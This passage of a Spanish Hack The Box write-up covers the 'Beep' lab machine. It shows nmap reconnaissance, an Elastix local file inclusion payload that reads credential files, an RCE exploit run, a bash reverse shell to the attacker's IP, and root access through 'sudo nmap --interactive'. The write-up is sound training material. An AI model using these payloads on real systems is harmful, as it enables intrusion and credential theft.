@@ -1,0 +1,786 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Beep - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Beep en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Beep">
+<meta property="og:url" content="http://localhost:4000/htb-beep/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Beep en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-beep/beep.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-07T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-beep/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Beep</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Beep">
+    <meta itemprop="description" content="Resolución de la máquina Beep en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 07, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Beep
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-07T00:00:00-05:00">September 07, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-beep/banner-beep.jpg" alt="" /></p>
+
+<h2 id="beep">Beep</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.7.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.7
+PING 10.10.10.7 <span class="o">(</span>10.10.10.7<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.7: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>147 ms
+
+<span class="nt">---</span> 10.10.10.7 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 146.622/146.622/146.622/0.000 ms
+
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.7 <span class="nt">-oG</span> allPorts                                                          
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.                                    
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-28 20:28 CDT                                                                    
+Initiating SYN Stealth Scan at 20:28                                                                                               
+Scanning 10.10.10.7 <span class="o">[</span>65535 ports]                                                                                                  
+Discovered open port 993/tcp on 10.10.10.7                                                                                         
+Discovered open port 110/tcp on 10.10.10.7
+Discovered open port 443/tcp on 10.10.10.7
+Discovered open port 995/tcp on 10.10.10.7
+Discovered open port 25/tcp on 10.10.10.7
+Discovered open port 143/tcp on 10.10.10.7
+Discovered open port 111/tcp on 10.10.10.7
+Discovered open port 22/tcp on 10.10.10.7
+Discovered open port 3306/tcp on 10.10.10.7
+Discovered open port 80/tcp on 10.10.10.7
+Discovered open port 10000/tcp on 10.10.10.7
+Discovered open port 4190/tcp on 10.10.10.7
+Discovered open port 5038/tcp on 10.10.10.7
+Discovered open port 4559/tcp on 10.10.10.7
+Discovered open port 4445/tcp on 10.10.10.7
+Discovered open port 878/tcp on 10.10.10.7
+Completed SYN Stealth Scan at 20:28, 13.93s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.7
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-08-28 20:28:06 CDT <span class="k">for </span>14s
+Not shown: 65519 closed ports
+Reason: 65519 resets
+PORT      STATE SERVICE          REASON
+22/tcp    open  ssh              syn-ack ttl 63
+25/tcp    open  smtp             syn-ack ttl 63
+80/tcp    open  http             syn-ack ttl 63
+110/tcp   open  pop3             syn-ack ttl 63
+111/tcp   open  rpcbind          syn-ack ttl 63
+143/tcp   open  imap             syn-ack ttl 63
+443/tcp   open  https            syn-ack ttl 63
+878/tcp   open  unknown          syn-ack ttl 63
+993/tcp   open  imaps            syn-ack ttl 63
+995/tcp   open  pop3s            syn-ack ttl 63
+3306/tcp  open  mysql            syn-ack ttl 63
+4190/tcp  open  sieve            syn-ack ttl 63
+4445/tcp  open  upnotifyp        syn-ack ttl 63
+4559/tcp  open  hylafax          syn-ack ttl 63
+5038/tcp  open  unknown          syn-ack ttl 63
+10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.11 seconds
+           Raw packets sent: 68531 <span class="o">(</span>3.015MB<span class="o">)</span> | Rcvd: 68531 <span class="o">(</span>2.741MB<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.7
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 <span class="nt">-oN</span> targeted                       
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-29 18:55 CDT                                                                    
+Nmap scan report <span class="k">for </span>10.10.10.7                                                                                                    
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>                                                                                                        
+                                                                                                                                   
+PORT      STATE SERVICE    VERSION                                                                                                 
+22/tcp    open  ssh        OpenSSH 4.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                              
+| ssh-hostkey:                                                                                                                     
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 <span class="o">(</span>DSA<span class="o">)</span>                                                                     
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d <span class="o">(</span>RSA<span class="o">)</span>                                                                     
+25/tcp    open  smtp       Postfix smtpd                                                                                           
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN                       
+80/tcp    open  http       Apache httpd 2.2.3                                                                                      
+|_http-server-header: Apache/2.2.3 <span class="o">(</span>CentOS<span class="o">)</span>                                                                                        
+|_http-title: Did not follow redirect to https://10.10.10.7/                                                                       
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4                                                            
+|_pop3-capabilities: PIPELINING UIDL IMPLEMENTATION<span class="o">(</span>Cyrus POP3 server v2<span class="o">)</span> USER EXPIRE<span class="o">(</span>NEVER<span class="o">)</span> RESP-CODES AUTH-RESP-CODE APOP TOP LOGIN-DELAY<span class="o">(</span>0<span class="o">)</span> STLS
+111/tcp   open  rpcbind    2 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            875/udp   status
+|_  100024  1            878/tcp   status
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_imap-capabilities: ACL CONDSTORE QUOTA OK URLAUTHA0001 IMAP4 LIST-SUBSCRIBED MAILBOX-REFERRALS <span class="nv">THREAD</span><span class="o">=</span>REFERENCES X-NETSCAPE LISTEXT UIDPLUS Completed STARTTLS IMAP4rev1 RENAME BINARY ID <span class="nv">RIGHTS</span><span class="o">=</span>kxte SORT LITERAL+ ANNOTATEMORE <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">SORT</span><span class="o">=</span>MODSEQ NAMESPACE MULTIAPPEND CHILDREN IDLE CATENATE NO ATOMIC UNSELECT
+443/tcp   open  ssl/https?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
+| Not valid before: 2017-04-07T08:22:08
+|_Not valid after:  2018-04-07T08:22:08
+|_ssl-date: 2021-08-30T00:03:16+00:00<span class="p">;</span> +4m41s from scanner time.
+878/tcp   open  status     1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+|_ssl-date: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_sslv2: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 <span class="o">(</span>included w/cyrus imap<span class="o">)</span>
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+5038/tcp  open  asterisk   Asterisk Call Manager 1.1
+10000/tcp open  http       MiniServ 1.570 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; Charset=iso-8859-1).
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+
+Host script results:
+|_clock-skew: 4m40s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 394.30 seconds
+</span></code></pre></div></div>
+
+<p>Obsevamos que se encuentra abierto el puerto 80 el cual redirige hacia el 443, así que tratamos de ver que contiene el servidor. Ingresando a la dirección <code class="language-plaintext highlighter-rouge">https://10.10.10.7/</code>, observamos el uso de la tecnología <strong>Elastix</strong> e identificamos un exploit público:</p>
+
+<p><a href="https://www.exploit-db.com/exploits/37637">Exploit-db</a></p>
+
+<p>Identificamos un exploit asociado a LFI (Local File Inclusion), debido a que no conocemos la versión con la que está trabajando el sitio web, podriá probar agregando la línea que se indica <code class="language-plaintext highlighter-rouge">/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code> y validar si tenemos la posibilidad de visualizar archivos del sistema; para este caso, el recurso <code class="language-plaintext highlighter-rouge">/etc/amportal.conf</code>.</p>
+
+<p><img src="/assets/images/htb-beep/beep_lfi.png" alt="" /></p>
+
+<p>En dicho documento podemos observar credenciales de acceso al portal de adminsitración de <strong>Elastix</strong>; además de que es posible que se esté utilizando reutilización de credenciales.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># This file is part of FreePBX.</span>
+<span class="c">#</span>
+<span class="c"># FreePBX is free software: you can redistribute it and/or modify</span>
+<span class="c"># it under the terms of the GNU General Public License as published by</span>
+<span class="c"># the Free Software Foundation, either version 2 of the License, or</span>
+<span class="c"># (at your option) any later version.</span>
+<span class="c">#</span>
+<span class="c"># FreePBX is distributed in the hope that it will be useful,</span>
+<span class="c"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="c"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the</span>
+<span class="c"># GNU General Public License for more details.</span>
+<span class="c">#</span>
+<span class="c"># You should have received a copy of the GNU General Public License</span>
+<span class="c"># along with FreePBX. If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
+<span class="c">#</span>
+<span class="c"># This file contains settings for components of the Asterisk Management Portal</span>
+<span class="c"># Spaces are not allowed!</span>
+<span class="c"># Run /usr/src/AMP/apply_conf.sh after making changes to this file</span>
+<span class="c"># FreePBX Database configuration</span>
+<span class="c"># AMPDBHOST: Hostname where the FreePBX database resides</span>
+<span class="c"># AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)</span>
+<span class="c"># AMPDBNAME: Name of the FreePBX database (e.g. asterisk)</span>
+<span class="c"># AMPDBUSER: Username used to connect to the FreePBX database</span>
+<span class="c"># AMPDBPASS: Password for AMPDBUSER (above)</span>
+<span class="c"># AMPENGINE: Telephony backend engine (e.g. asterisk)</span>
+<span class="c"># AMPMGRUSER: Username to access the Asterisk Manager Interface</span>
+<span class="c"># AMPMGRPASS: Password for AMPMGRUSER</span>
+<span class="c">#</span>
+...
+</code></pre></div></div>
+
+<p>Ahora debemos buscar una forma de poder ingresar a la máquina víctima. Existen tres formas de ingresar a la máquina. Para la primera forma, ingresamos al panel de administración en <code class="language-plaintext highlighter-rouge">http://10.10.10.7/</code> y observamos el uso de <strong>Elastix</strong> y buscamos un exploit asociado a RCE:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit elastix
+<span class="nt">-------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                   |  Path
+<span class="nt">-------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Elastix - <span class="s1">'page'</span> Cross-Site Scripting                                                            | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                          | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                    | php/webapps/34942.txt
+Elastix 2.2.0 - <span class="s1">'graph.php'</span> Local File Inclusion                                                 | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                | php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                                                               | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                           | php/webapps/18650.py
+<span class="nt">-------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Observamos el recurso <em>php/webapps/18650.py</em>; sin embargo, para este caso, se utilizará el siguiente recurso <a href="https://github.com/k4miyo/FreePBX-Elastix-RCE-exploit">Elastix RCE</a>:</p>
+
+<p><a href="https://github.com/k4miyo/FreePBX-Elastix-RCE-exploit">Github</a></p>
+
+<p>Para ejecutar el exploit, nos solicita información como: <em>rhost</em>, <em>lhost</em>, <em>lport</em> y <em>extension</em>. Para obtener la extensión, ejecutamos el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ svwar <span class="nt">-m</span> INVITE <span class="nt">-e100-500</span> 10.10.10.7                                                                                             
+WARNING:TakeASip:using an INVITE scan on an endpoint <span class="o">(</span>i.e. SIP phone<span class="o">)</span> may cause it to ring and wake up people <span class="k">in </span>the middle of the 
+night                                                                                                                              
+WARNING:TakeASip:extension <span class="s1">'100'</span> probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension <span class="s1">'102'</span> probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension <span class="s1">'113'</span> probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension <span class="s1">'118'</span> probably exists but the response is unexpected                                                    
+WARNING:TakeASip:extension <span class="s1">'122'</span> probably exists but the response is unexpected
+...
++-----------+----------------+
+| Extension | Authentication |
++<span class="o">===========</span>+<span class="o">================</span>+
+| 100       | weird          |
++-----------+----------------+
+| 102       | weird          |
++-----------+----------------+
+| 113       | weird          |
++-----------+----------------+
+| 118       | weird          |
++-----------+----------------+
++-----------+----------------+
+| 351       | weird          |
++-----------+----------------+
+| 233       | reqauth        |
++-----------+----------------+
+| 235       | weird          |
++-----------+----------------+
++-----------+----------------+
+| 493       | weird          |
++-----------+----------------+
+| 497       | weird          |
++-----------+----------------+
+</code></pre></div></div>
+
+<p>Para este caso, el valor de <em>extension</em> es 233. Una vez realizados los cambios y procedemos a ejecutar el exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python elastix_rce.py <span class="nt">--lhost</span> 10.10.14.6
+<span class="o">[</span>+] Payload: Payload generated
+<span class="o">[</span>+] Shell: Established connection!
+<span class="o">[</span>+] Trying to <span class="nb">bind </span>to :: on port 443: Done
+<span class="o">[</span>+] Waiting <span class="k">for </span>connections on :::443: Got connection from ::ffff:10.10.10.7 on port 45927
+<span class="o">[</span>-] Request: Payload sent correctly
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">whoami
+</span>asterisk
+<span class="nv">$ </span>ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:B2:53  
+          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:628 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:456 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:100256 <span class="o">(</span>97.9 KiB<span class="o">)</span>  TX bytes:111602 <span class="o">(</span>108.9 KiB<span class="o">)</span>
+          Interrupt:59 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:7558 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:7558 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1124965 <span class="o">(</span>1.0 MiB<span class="o">)</span>  TX bytes:1124965 <span class="o">(</span>1.0 MiB<span class="o">)</span>
+<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Nos encontramos dentro de la máquina, ahora para trabajar un poco mas ordenados; nos establecemos una conexión hacia nuestro equipo de atacante; por lo que ejecutamos el siguiente com ando y nos ponemos en escucha por el puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"</span>
+<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.7] 56804
+bash: no job control <span class="k">in </span>this shell
+bash-3.2<span class="nv">$ </span><span class="nb">whoami
+</span>asterisk
+bash-3.2<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Hacemos un <a href="/tratamiento-tty">Tratamiento de la tty</a> y comenzamos con la enumeración de los permisos que tiene el usuario <em>asterisk</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>100<span class="o">(</span>asterisk<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>101<span class="o">(</span>asterisk<span class="o">)</span>
+bash-3.2<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>asterisk on this host:
+    env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"</span>
+
+User asterisk may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/shutdown
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/yum
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/touch
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/chmod
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/chown
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/service
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/init
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/postmap
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/postfix
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/saslpasswd2
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/hardware_detector
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/chkconfig
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/sbin/elastix-helper
+bash-3.2<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Observamos que tienemos multiples recursos que podemos ejecutar temporalmente como el usuario <em>root</em>; para este caso se utilizará <em>nmap</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2<span class="nv">$ </span>nmap <span class="nt">--version</span>
+
+Nmap version 4.11 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
+bash-3.2<span class="nv">$ </span>
+bash-3.2<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
+
+Starting Nmap V. 4.11 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
+Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
+</span>nmap&gt; <span class="o">!</span>sh
+sh-3.2# <span class="nb">whoami
+</span>root
+sh-3.2#
+</code></pre></div></div>
+
+<p>Con esto ya somos el usuario <strong>root</strong> y podemos visualizar las flags.</p>
+
+<p>Otro método de acceso al sistema es mediante la validación de reutilización de contraseñas; validando si con las credenciales que identificamos a partir del <strong>LFI</strong> nos dan acceso a través del servicio SSH como el usuario <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh root@10.10.10.7
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+</code></pre></div></div>
+
+<p>Al ejecutar el comando <code class="language-plaintext highlighter-rouge">ssh root@10.10.10.7</code> nos aparece un error; sólo tenemos que agregar <code class="language-plaintext highlighter-rouge">-oKexAlgorithms=+diffie-hellman-group1-sha1</code> al comando para poder acceder:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-oKexAlgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1 root@10.10.10.7
+The authenticity of host <span class="s1">'10.10.10.7 (10.10.10.7)'</span> can<span class="s1">'t be established.
